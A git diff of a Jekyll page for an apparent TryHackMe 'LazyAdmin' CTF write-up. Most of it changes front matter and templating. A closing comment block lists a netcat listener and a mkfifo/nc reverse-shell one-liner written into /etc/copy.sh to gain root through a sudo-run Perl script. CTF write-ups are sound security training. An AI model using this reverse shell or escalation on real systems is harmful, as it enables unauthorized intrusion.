@@ -1,17 +1,25 @@
 ---
-layout: default
-title: LazyAdmin
+layout: single
+title: "LazyAdmin"
+link: "https://tryhackme.com/room/lazyadmin"
 parent: TryHackMe
+os: Linux
+difficulty: Easy
+tags: [Nmap, Feroxbuster, Netcat]
+starred: false
+date: 2025-11-08
+toc: true
+toc_sticky: true
+toc_label: "Mission Log"
+toc_icon: "crosshairs"
 ---
-# CTF Writeup: [LazyAdmin](https://tryhackme.com/room/lazyadmin)
-![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
-![Tags](https://img.shields.io/badge/Tags-MySQL%20Backup%20%7C%20PHP%20Shell-orange)
+# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
+{% include ctf-badges.html %}
 
-> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
-> **OS:** Linux |
-> **Difficulty:** Easy |
-> **Date:** 08.11.2025 |
+> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
+> **OS:** {{ page.os }} |
+> **Difficulty:** {{ page.difficulty }} |
+> **Date:** {{ page.date }} |
 > **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)
 
 ---
@@ -137,4 +145,19 @@ THM{6637...699f}
 ```
 
 ---
-<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
+
+{% comment %}
+
+[Technique]: Directory Brute Force
+[Command]: feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/big.txt
+[Why]: Discovered hidden CMS login pages (/content/as/) and database backups.
+
+[Technique]: Reverse Shell Listener
+[Command]: nc -lnvp 1234
+[Why]: Catches the connection from the PHP reverse shell uploaded to the CMS.
+
+[Technique]: Perl Script Injection
+[Command]: echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 5554 >/tmp/f" > /etc/copy.sh
+[Why]: Overwrote a script called by a sudo-enabled Perl backup file to escalate to root.
+
+{% endcomment %}
